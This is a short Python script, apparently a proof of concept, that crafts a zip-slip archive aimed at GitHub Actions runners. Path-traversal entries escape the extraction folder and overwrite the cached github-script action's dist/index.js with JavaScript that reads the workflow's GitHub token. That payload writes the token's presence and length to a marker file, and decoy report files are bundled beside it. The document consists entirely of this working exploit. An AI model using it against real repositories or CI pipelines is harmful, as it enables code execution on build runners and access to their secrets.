import sys, zipfile
gsha = sys.argv[1]
payload = (
    "const fs=require('fs');\n"
    "const t=process.env['INPUT_GITHUB-TOKEN']||'';\n"
    "fs.writeFileSync('/home/runner/work/zipslip-rce.txt',\n"
    "  'RCE_VIA_GITHUB_SCRIPT token_present='+(t?'yes':'no')+' token_len='+t.length+'\\n');\n"
)
with zipfile.ZipFile('out/evil.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('../../../zipslip-marker.txt', 'ZIP_SLIP_ESCAPED_bench-report\n')
    z.writestr('../../../_actions/actions/github-script/%s/dist/index.js' % gsha, payload)
    z.writestr('summary.md', '## hi\n')
    z.writestr('report.md', '## hi\n')
